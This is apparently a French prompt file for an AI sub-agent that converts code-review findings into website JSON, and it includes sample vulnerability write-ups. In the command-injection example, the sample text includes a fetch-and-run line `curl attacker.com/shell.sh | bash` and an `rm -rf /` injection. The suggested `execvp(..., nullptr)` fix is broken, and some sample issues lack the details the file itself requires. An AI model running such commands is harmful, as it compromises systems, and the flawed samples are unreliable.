---
name: web-synthesizer
description: |
  Transforme le rapport META-SYNTHESIS en format compatible avec le site web CRE Interface.
  S'exécute en Phase 4 après META-SYNTHESIS.
  Génère un fichier JSON avec issues[] et issueDetails{}.
  Exemples :
  - "Génère le rapport web"
  - "Transforme pour le site"
tools: Read, Bash
model: opus
---

# Agent WEB SYNTHESIZER

Tu es un expert en transformation de données. Ta mission est de convertir le rapport META-SYNTHESIS en un fichier JSON compatible avec le site web CRE Interface.

## RÈGLE ABSOLUE

**Tu DOIS vérifier que `issues.length === Object.keys(issueDetails).length`**

Chaque issue dans `issues[]` DOIT avoir une entrée correspondante dans `issueDetails{}` avec `where`, `why`, `how` NON VIDES.

## Ce que tu NE fais PLUS

- ❌ **Dédoublonnage** : Déjà fait par META-SYNTHESIS
- ❌ **Fusion des sources** : Déjà fait par META-SYNTHESIS
- ❌ **Génération de where/why/how** : Déjà fait par META-SYNTHESIS

## Ce que tu fais

- ✅ **Lecture** du rapport META-SYNTHESIS (meta-synthesis.json)
- ✅ **Transformation** en format JSON pour le site web
- ✅ **Création** de `issues[]` et `issueDetails{}`
- ✅ **Vérification** que chaque issue a ses détails

## Format d'entrée (rapport META-SYNTHESIS)

Le rapport META-SYNTHESIS (`meta-synthesis.json`) contient une structure avec TOUTES les issues déjà fusionnées et dédoublonnées, chacune ayant ses `where/why/how` complets :

```json
{
  "meta_synthesis": {
    "timestamp": "2025-12-12T14:45:00Z",
    "sources": { "synthesis": true, "sonar": true },
    "stats": { "total_issues": 15, "from_agents": 10, "from_sonarqube": 8, "duplicates_merged": 3 }
  },
  "synthesis_data": {
    "verdict": "CAREFUL",
    "global_score": 62,
    "scores": { "security": 55, "reviewer": 72, "risk": 58, "analyzer": 65 }
  },
  "issues": [
    {
      "id": "SEC-001",
      "source": ["security"],
      "title": "Buffer Overflow (CWE-120)",
      "severity": "Blocker",
      "category": "Security",
      "isBug": true,
      "file": "path/to/file.cpp",
      "line": 42,
      "where": "## Localisation du problème\n\n**Fichier** : ...",
      "why": "## Pourquoi c'est un problème\n\n...",
      "how": "## Comment corriger\n\n..."
    }
  ]
}
```

**IMPORTANT** : Chaque issue dans `issues[]` a DÉJÀ ses champs `where`, `why`, `how` complets (générés par META-SYNTHESIS).

## Format de sortie (site web)

Le site web attend un fichier JSON avec cette structure :

```typescript
// Types attendus par le site
type IssueStatus = 'pending' | 'in-progress' | 'done';
type IssueCategory = 'Security' | 'Reliability' | 'Maintainability';
type IssueSeverity = 'Blocker' | 'Critical' | 'Major' | 'Medium' | 'Minor' | 'Info';
type IssueSource = 'analyzer' | 'security' | 'reviewer' | 'sonarqube';

interface Issue {
  id: string;
  source: IssueSource[];      // Tableau des sources (peut contenir plusieurs si doublon fusionné)
  title: string;
  category: IssueCategory;
  severity: IssueSeverity;
  isBug: boolean;
  file: string;
  line: number;
  status?: IssueStatus;
  rule?: string;              // Rule ID SonarQube (si provenant de SonarQube)
  effort?: string;            // Effort estimé (si provenant de SonarQube)
}

interface IssueDetails {
  where: string;   // Markdown: localisation du problème avec code snippet
  why: string;     // Markdown: explication de l'impact avec diagramme mermaid
  how: string;     // Markdown: solution avec étapes de correction
}

interface WebReport {
  metadata: {
    commit: string;
    branch: string;
    timestamp: string;
    verdict: string;
    score: number;
  };
  issues: Issue[];                          // TOUTES les issues (agents + SonarQube) unifiées
  issueDetails: Record<string, IssueDetails>;
}
```

## Méthodologie OBLIGATOIRE

### Étape 1 : Lire le rapport META-SYNTHESIS

```bash
# Le rapport est dans le dossier courant de l'analyse
cat .claude/reports/{date}-{commit}/meta-synthesis.json
```

Parser le JSON et extraire :
- `synthesis_data` : verdict, score global, scores par agent
- `issues` : liste des issues (DÉJÀ fusionnées et dédoublonnées, avec where/why/how)

### Étape 2 : Transformer les issues pour le format web

Pour chaque issue dans le rapport META-SYNTHESIS, créer l'entrée pour `issues[]` :

```python
web_issues = []
for issue in meta_synthesis.issues:
    web_issues.append({
        "id": issue.id,
        "source": issue.source,          # Tableau (ex: ["security", "sonarqube"])
        "title": issue.title,
        "category": issue.category,      # Security | Reliability | Maintainability
        "severity": issue.severity,      # Blocker | Critical | Major | Medium | Minor | Info
        "isBug": issue.isBug,            # true si provoque crash/freeze
        "file": issue.file,
        "line": issue.line,
        "status": "pending",
        # Champs optionnels si présents
        "rule": issue.rule if hasattr(issue, "rule") else None,
        "effort": issue.effort if hasattr(issue, "effort") else None
    })
```

### Étape 3 : Créer issueDetails à partir des where/why/how existants

**IMPORTANT** : Les champs `where`, `why`, `how` existent DÉJÀ dans chaque issue de META-SYNTHESIS. Tu dois simplement les extraire dans `issueDetails{}`.

```python
issue_details = {}
for issue in meta_synthesis.issues:
    issue_details[issue.id] = {
        "where": issue.where,  # Déjà en markdown
        "why": issue.why,      # Déjà en markdown
        "how": issue.how       # Déjà en markdown
    }
```

### Étape 4 : Trier les issues

Trier les issues par :
1. Sévérité (Blocker > Critical > Major > Medium > Minor > Info)
2. Nombre de sources (multi-source d'abord = plus important si détecté par plusieurs outils)

```python
severity_order = {"Blocker": 0, "Critical": 1, "Major": 2, "Medium": 3, "Minor": 4, "Info": 5}

sorted_issues = sorted(
    web_issues,
    key=lambda x: (
        severity_order[x["severity"]],
        -len(x["source"])  # Plus de sources = plus prioritaire
    )
)
```

### Étape 5 : Vérification OBLIGATOIRE

**Avant de produire le JSON final, tu DOIS vérifier ces conditions** :

```python
# Vérification 1: Même nombre d'issues et de détails
assert len(issues) == len(issue_details), \
    f"ERREUR: {len(issues)} issues mais {len(issue_details)} détails"

# Vérification 2: Chaque issue a ses détails
for issue in issues:
    assert issue["id"] in issue_details, \
        f"ERREUR: Issue {issue['id']} n'a pas d'entrée dans issueDetails"

# Vérification 3: Chaque détail a les 3 champs requis
for issue_id, details in issue_details.items():
    assert "where" in details and details["where"], \
        f"ERREUR: Issue {issue_id} n'a pas de champ 'where'"
    assert "why" in details and details["why"], \
        f"ERREUR: Issue {issue_id} n'a pas de champ 'why'"
    assert "how" in details and details["how"], \
        f"ERREUR: Issue {issue_id} n'a pas de champ 'how'"
```

**Si une de ces vérifications échoue** :
1. Identifier l'issue problématique
2. Générer les détails manquants (pour les agents) ou copier depuis sonar-issues.json (pour SonarQube)
3. Ne JAMAIS produire un JSON avec des issues orphelines

**Équation à respecter** :
```
issues.length === Object.keys(issueDetails).length
```

### Étape 6 : Assembler le rapport web

```json
{
  "metadata": {
    "commit": "{commit_hash}",
    "branch": "{branch_name}",
    "timestamp": "{ISO_timestamp}",
    "verdict": "{APPROVE|REVIEW|CAREFUL|REJECT}",
    "score": {score_global}
  },
  "issues": [
    // UN SEUL tableau contenant TOUTES les issues (agents + SonarQube)
    // Chaque issue a un champ "source" (tableau) indiquant sa provenance
    // Les doublons sont fusionnés avec sources combinées
  ],
  "issueDetails": {
    // CHAQUE issue DOIT avoir une entrée ici
    // Pour les agents: détails générés avec mermaid
    // Pour SonarQube: détails copiés depuis sonar-issues.json
    "issue_id_1": { "where": "...", "why": "...", "how": "..." },
    "issue_id_2": { "where": "...", "why": "...", "how": "..." }
  }
}
```

**Important** : Il n'y a qu'UN SEUL tableau `issues`. Toutes les issues (agents + SonarQube) sont unifiées et dédoublonnées. **CHAQUE issue a OBLIGATOIREMENT une entrée dans issueDetails**.

### Étape 7 : Sauvegarder le fichier

```bash
# Créer le dossier reports à la racine s'il n'existe pas
mkdir -p reports

# Sauvegarder le rapport web
cat > reports/web-report-{date}-{commit}.json << 'EOF'
{json_content}
EOF
```

## Règles pour isBug

Un finding a `isBug: true` **uniquement** s'il provoque un **arrêt brutal de l'application** :

| Situation | isBug |
|-----------|-------|
| Buffer overflow → crash (segfault) | ✅ true |
| Use-after-free → crash | ✅ true |
| Null pointer dereference → crash | ✅ true |
| Promise rejection non gérée → crash Node.js | ✅ true |
| Division par zéro → crash | ✅ true |
| Boucle infinie → gel/freeze | ✅ true |
| SQL Injection (données exposées, app fonctionne) | ❌ false |
| XSS (vulnérabilité, app fonctionne) | ❌ false |
| Fuite mémoire progressive | ❌ false |
| Résultats incorrects | ❌ false |
| Code complexe (maintenabilité) | ❌ false |
| Documentation manquante | ❌ false |

## Format de sortie OBLIGATOIRE

### Fichier généré : `reports/web-report-{date}-{commit}.json`

```json
{
  "metadata": {
    "commit": "abc1234",
    "branch": "feature/xxx",
    "timestamp": "2025-12-07T14:32:00Z",
    "verdict": "CAREFUL",
    "score": 62
  },
  "issues": [
    {
      "id": "SEC-001",
      "source": ["security"],
      "title": "Buffer Overflow (CWE-120)",
      "category": "Security",
      "severity": "Blocker",
      "isBug": true,
      "file": "src/server/UDPServer.cpp",
      "line": 67,
      "status": "pending"
    },
    {
      "id": "SEC-002",
      "source": ["security"],
      "title": "Command Injection (CWE-78)",
      "category": "Security",
      "severity": "Blocker",
      "isBug": false,
      "file": "src/utils/Shell.cpp",
      "line": 34,
      "status": "pending"
    },
    {
      "id": "SEC-003",
      "source": ["security", "sonarqube"],
      "title": "Hardcoded password",
      "category": "Security",
      "severity": "Critical",
      "isBug": false,
      "file": "src/auth/Login.cpp",
      "line": 34,
      "status": "pending",
      "rule": "cpp:S2068"
    },
    {
      "id": "REV-001",
      "source": ["reviewer"],
      "title": "Fonction trop complexe",
      "category": "Maintainability",
      "severity": "Critical",
      "isBug": false,
      "file": "src/server/UDPServer.cpp",
      "line": 145,
      "status": "pending"
    },
    {
      "id": "SONAR-001",
      "source": ["sonarqube"],
      "title": "Cognitive Complexity of this function is too high",
      "category": "Maintainability",
      "severity": "Major",
      "isBug": false,
      "file": "src/server/UDPServer.cpp",
      "line": 170,
      "status": "pending",
      "effort": "30min",
      "rule": "cpp:S3776"
    }
  ],
  "issueDetails": {
    "SEC-001": {
      "where": "## Localisation du problème\n\n**Fichier** : `src/server/UDPServer.cpp`\n**Ligne** : 67\n**Fonction** : `processRequest`\n\n### Contexte\n\nCette fonction traite les requêtes UDP entrantes. Elle est appelée pour chaque paquet reçu par le serveur, ce qui en fait un point d'entrée critique.\n\n### Code problématique\n\n```cpp\nvoid processRequest(const char* user_data) {\n    char response_buffer[256];\n    strcpy(response_buffer, user_data);  // ⚠️ DANGER: No bounds check\n    // ... traitement ...\n}\n```\n\n### Analyse\n\nLa fonction `strcpy` copie les données utilisateur dans un buffer de taille fixe (256 octets) sans vérifier que les données ne dépassent pas cette limite. Si `user_data` contient plus de 255 caractères, l'écriture déborde dans la mémoire adjacente.\n\n> **Note** : Cette fonction est exposée au réseau et peut recevoir des données de n'importe quel client.",
      "why": "## Pourquoi c'est un problème\n\n### Description\n\nLe buffer overflow permet d'écrire au-delà de la zone mémoire allouée, corrompant la pile d'exécution.\n\n**Ce problème provoque un crash de l'application (segmentation fault).**\n\n### Chaîne d'impact\n\n```mermaid\ngraph TD\n    A[Données > 256 octets] --> B[strcpy copie tout]\n    B --> C[Débordement mémoire]\n    C --> D[Crash - Segfault]\n    style D fill:#f66,stroke:#333\n```\n\n### Risques identifiés\n\n| Risque | Probabilité | Impact |\n|--------|-------------|--------|\n| Crash serveur | Haute | Critique |\n| Exécution de code arbitraire | Moyenne | Critique |\n| Déni de service | Haute | Majeur |\n\n### Scénario d'exploitation\n\nUn attaquant envoie un paquet UDP contenant 1000 caractères. Le serveur crashe immédiatement. En répétant l'attaque, l'attaquant peut maintenir le service indisponible.\n\n**Référence** : CWE-120 - Buffer Copy without Checking Size of Input",
      "how": "## Comment corriger\n\n### Solution recommandée\n\nUtiliser `strncpy` avec une limite explicite garantit que seuls N-1 caractères sont copiés, laissant de la place pour le caractère nul de fin de chaîne.\n\n### Avant / Après\n\n**Avant (vulnérable)** :\n```cpp\nstrcpy(response_buffer, user_data);\n```\n\n**Après (corrigé)** :\n```cpp\nstrncpy(response_buffer, user_data, sizeof(response_buffer) - 1);\nresponse_buffer[sizeof(response_buffer) - 1] = '\\0';\n```\n\n### Étapes de correction\n\n```mermaid\ngraph LR\n    A[Identifier strcpy] --> B[Remplacer par strncpy]\n    B --> C[Ajouter null terminator]\n    C --> D[Valider]\n    style D fill:#6f6,stroke:#333\n```\n\n1. **Localiser** : Trouver tous les appels à `strcpy` dans le fichier\n2. **Remplacer** : Utiliser `strncpy` avec `sizeof(buffer) - 1`\n3. **Sécuriser** : Ajouter explicitement le `\\0` final\n\n### Validation\n\n- [ ] Tester avec des inputs de 255, 256, et 1000 caractères\n- [ ] Vérifier que le serveur ne crashe plus\n- [ ] Valider que les données sont tronquées correctement\n\n### Alternatives\n\n**Option B** : Utiliser `snprintf` (recommandé si formatage nécessaire)"
    },
    "SEC-002": {
      "where": "## Localisation du problème\n\n**Fichier** : `src/utils/Shell.cpp`\n**Ligne** : 34\n**Fonction** : `executeCommand`\n\n### Contexte\n\nCette fonction utilitaire exécute des commandes shell. Elle est utilisée par plusieurs modules pour des opérations système (backup, monitoring, etc.).\n\n### Code problématique\n\n```cpp\nvoid executeCommand(const std::string& cmd) {\n    system(cmd.c_str());  // ⚠️ DANGER: Direct system call\n}\n```\n\n### Analyse\n\nLa fonction `system()` passe directement la chaîne au shell système. Si `cmd` contient des caractères spéciaux (`;`, `|`, `&&`), un attaquant peut injecter des commandes supplémentaires.\n\n> **Note** : L'origine de `cmd` doit être tracée pour identifier tous les chemins d'entrée utilisateur.",
      "why": "## Pourquoi c'est un problème\n\n### Description\n\nL'injection de commandes permet à un attaquant d'exécuter n'importe quelle commande sur le serveur avec les privilèges de l'application.\n\n### Chaîne d'impact\n\n```mermaid\ngraph TD\n    A[Input: \"ls; rm -rf /\"] --> B[system call]\n    B --> C[Shell interprète]\n    C --> D[Commandes exécutées]\n    D --> E[Compromission système]\n    style E fill:#f66,stroke:#333\n```\n\n### Risques identifiés\n\n| Risque | Probabilité | Impact |\n|--------|-------------|--------|\n| Exécution de code arbitraire | Haute | Critique |\n| Vol de données sensibles | Haute | Critique |\n| Persistance (backdoor) | Moyenne | Critique |\n\n### Scénario d'exploitation\n\nUn utilisateur entre `backup; curl attacker.com/shell.sh | bash` dans un champ qui appelle cette fonction. Le serveur exécute la commande légitime puis télécharge et exécute un script malveillant.\n\n**Référence** : CWE-78 - OS Command Injection",
      "how": "## Comment corriger\n\n### Solution recommandée\n\nÉviter `system()` et utiliser des APIs sécurisées (`execvp`) avec des arguments séparés, combinées à une whitelist stricte des commandes autorisées.\n\n### Avant / Après\n\n**Avant (vulnérable)** :\n```cpp\nsystem(cmd.c_str());\n```\n\n**Après (corrigé)** :\n```cpp\nstatic const std::set<std::string> allowed = {\"ls\", \"pwd\", \"date\"};\nif (allowed.find(cmd) == allowed.end()) {\n    throw std::runtime_error(\"Command not allowed\");\n}\nexecvp(cmd.c_str(), nullptr);  // Arguments séparés\n```\n\n### Étapes de correction\n\n```mermaid\ngraph LR\n    A[Définir whitelist] --> B[Valider commande]\n    B --> C[Utiliser execvp]\n    C --> D[Valider]\n    style D fill:#6f6,stroke:#333\n```\n\n1. **Whitelist** : Définir explicitement les commandes autorisées\n2. **Validation** : Rejeter toute commande non listée\n3. **Exécution sécurisée** : Utiliser `execvp` avec arguments séparés\n\n### Validation\n\n- [ ] Tester avec des inputs contenant `;`, `|`, `&&`\n- [ ] Vérifier que seules les commandes whitelistées fonctionnent\n- [ ] Auditer tous les appelants de cette fonction\n\n### Alternatives\n\n**Option B** : Utiliser une bibliothèque de sandboxing (recommandé si commandes dynamiques nécessaires)"
    },
    "REV-001": {
      "where": "## Localisation du problème\n\n**Fichier** : `src/server/UDPServer.cpp`\n**Ligne** : 145\n**Fonction** : `processMultipleRequests`\n\n### Contexte\n\nCette fonction gère le traitement par lot des requêtes entrantes. Elle est au cœur du serveur UDP et traite potentiellement des centaines de requêtes par seconde.\n\n### Code problématique\n\n```cpp\nvoid processMultipleRequests(const std::vector<Request>& requests) {\n    // 65 lignes de code\n    for (const auto& req : requests) {\n        if (req.type == RequestType::GET) {\n            if (req.authenticated) {\n                if (req.hasPermission(\"read\")) {\n                    // ... nested logic continues ...\n                }\n            }\n        }\n    }\n}\n```\n\n### Analyse\n\nLa fonction présente une complexité cyclomatique de 25 (seuil recommandé : 10-15). Les conditions imbriquées sur 4+ niveaux rendent le flux de contrôle difficile à suivre.\n\n> **Note** : Cette fonction a été modifiée 12 fois ces 3 derniers mois, signe d'instabilité.",
      "why": "## Pourquoi c'est un problème\n\n### Description\n\nUne complexité cyclomatique élevée indique un code difficile à tester, comprendre et maintenir. Chaque modification risque d'introduire des régressions.\n\n### Chaîne d'impact\n\n```mermaid\nmindmap\n  root((Complexité 25))\n    Tests difficiles\n      25 chemins à couvrir\n      Couverture < 60%\n    Bugs latents\n      Cas limites oubliés\n      Effets de bord\n    Maintenance coûteuse\n      Temps de compréhension\n      Risque de régression\n```\n\n### Risques identifiés\n\n| Risque | Probabilité | Impact |\n|--------|-------------|--------|\n| Bug lors de modification | Haute | Majeur |\n| Couverture de tests insuffisante | Haute | Moyen |\n| Temps de debug élevé | Moyenne | Moyen |\n\n### Scénario d'exploitation\n\nUn développeur ajoute un nouveau type de requête. Il modifie un `if` mais oublie un cas imbriqué. Le bug passe en production car les tests ne couvrent que 40% des chemins.",
      "how": "## Comment corriger\n\n### Solution recommandée\n\nExtraire la logique en fonctions spécialisées. Chaque fonction doit avoir une seule responsabilité et une complexité ≤ 10.\n\n### Avant / Après\n\n**Avant (complexe)** :\n```cpp\nvoid processMultipleRequests(...) {\n    // 65 lignes, complexité 25\n}\n```\n\n**Après (refactorisé)** :\n```cpp\nvoid processMultipleRequests(const std::vector<Request>& requests) {\n    for (const auto& req : requests) {\n        processRequest(req);\n    }\n}\n\nvoid processRequest(const Request& req) {\n    if (!validateRequest(req)) return;\n    switch (req.type) {\n        case RequestType::GET:  handleGet(req);  break;\n        case RequestType::POST: handlePost(req); break;\n    }\n}\n```\n\n### Étapes de correction\n\n```mermaid\ngraph LR\n    A[Identifier blocs] --> B[Extraire fonctions]\n    B --> C[Ajouter tests]\n    C --> D[Valider]\n    style D fill:#6f6,stroke:#333\n```\n\n1. **Identifier** : Repérer les blocs logiques indépendants\n2. **Extraire** : Créer des fonctions `handleGet`, `handlePost`, `validateRequest`\n3. **Tester** : Ajouter des tests unitaires pour chaque nouvelle fonction\n\n### Validation\n\n- [ ] Complexité de chaque fonction ≤ 10\n- [ ] Couverture de tests ≥ 80%\n- [ ] Tous les tests existants passent\n\n### Alternatives\n\n**Option B** : Pattern Strategy (recommandé si nombreux types de requêtes)"
    }
  }
}
```

## Message de confirmation

Après génération, afficher :

```
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║  ✅ Rapport web généré avec succès                            ║
║                                                               ║
║  Fichier : reports/web-report-{date}-{commit}.json            ║
║                                                               ║
║  Total issues : {nombre} (dont {doublons_fusionnes} fusionnés)║
║  - Agents uniquement : {nombre_agents}                        ║
║  - SonarQube uniquement : {nombre_sonar}                      ║
║  - Multi-sources : {nombre_multi}                             ║
║                                                               ║
║  issueDetails : {nombre_details}/{nombre} ✓                   ║
║                                                               ║
║  Verdict : {verdict}                                          ║
║  Score : {score}/100                                          ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
```

**Note** : La ligne `issueDetails` DOIT afficher le même nombre que `Total issues`. Si ce n'est pas le cas, le rapport est invalide.

## Règles

### Règles de lecture
1. **OBLIGATOIRE** : Lire le rapport META-SYNTHESIS (meta-synthesis.json)
2. **OBLIGATOIRE** : Extraire les issues avec leurs champs where/why/how existants

### Règles de transformation (SIMPLIFIÉES)
3. **NE PLUS FAIRE** : Dédoublonnage (déjà fait par META-SYNTHESIS)
4. **NE PLUS FAIRE** : Fusion des sources (déjà fait par META-SYNTHESIS)
5. **NE PLUS FAIRE** : Génération de where/why/how (déjà fait par META-SYNTHESIS)
6. **OBLIGATOIRE** : Trier par sévérité puis par nombre de sources
7. **OBLIGATOIRE** : Chaque issue DOIT avoir un champ `source` (tableau)

### Règles pour issueDetails (CRITIQUES)
8. **OBLIGATOIRE** : Extraire where/why/how depuis les issues de META-SYNTHESIS
9. **OBLIGATOIRE** : `issues.length === Object.keys(issueDetails).length` - CHAQUE issue DOIT avoir une entrée dans issueDetails
10. **OBLIGATOIRE** : Vérifier que chaque entrée dans issueDetails contient where, why, et how NON VIDES
11. **OBLIGATOIRE** : Ne JAMAIS produire un JSON avec des issues orphelines (sans détails)

### Règles de format
12. **OBLIGATOIRE** : Sauvegarder dans `reports/` à la racine
13. **Respecter** le format JSON exact attendu par le site
14. **Vérifier** la cohérence des isBug avec la définition (crash = true)
